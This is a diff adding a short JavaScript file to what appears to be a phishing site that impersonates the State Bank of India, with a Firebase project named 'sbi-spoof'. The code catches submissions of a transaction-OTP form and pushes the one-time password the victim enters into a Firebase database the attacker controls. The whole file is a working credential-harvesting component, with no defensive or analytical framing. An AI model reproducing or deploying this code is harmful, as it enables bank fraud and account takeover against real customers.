@@ -1,0 +1,41 @@
+const firebaseConfig = {
+    apiKey: "AIzaSyCOKI3PTEQxV-nQXQiRLVOi4_Gc5kRAuEw",
+    authDomain: "sbi-spoof.firebaseapp.com",
+    databaseURL: "https://sbi-spoof-default-rtdb.firebaseio.com",
+    projectId: "sbi-spoof",
+    storageBucket: "sbi-spoof.appspot.com",
+    messagingSenderId: "955522153499",
+    appId: "1:955522153499:web:4f18672b1d5a8750618cbe",
+    measurementId: "G-35F13H8VZH"
+  };
+
+  // initialize firebase
+firebase.initializeApp(firebaseConfig);
+
+//For Otp 2
+// reference your database
+var spoofData = firebase.database().ref("sbi-spoof-otp-transaction");
+
+document.getElementById("otp_transaction").addEventListener("submit", submitForm);
+
+function submitForm(e) {
+    e.preventDefault();
+
+    var otp2 = getElementVal("otp2");
+   
+
+    saveOtpTransaction(otp2);
+
+    //   reset the form
+    document.getElementById("otp_transaction").reset();
+}
+const saveOtpTransaction = (otp2) => {
+    var newSpoofData = spoofData.push();
+
+    newSpoofData.set({
+        otp_transaction: otp2,
+    });
+};
+const getElementVal = (id) => {
+    return document.getElementById(id).value;
+};
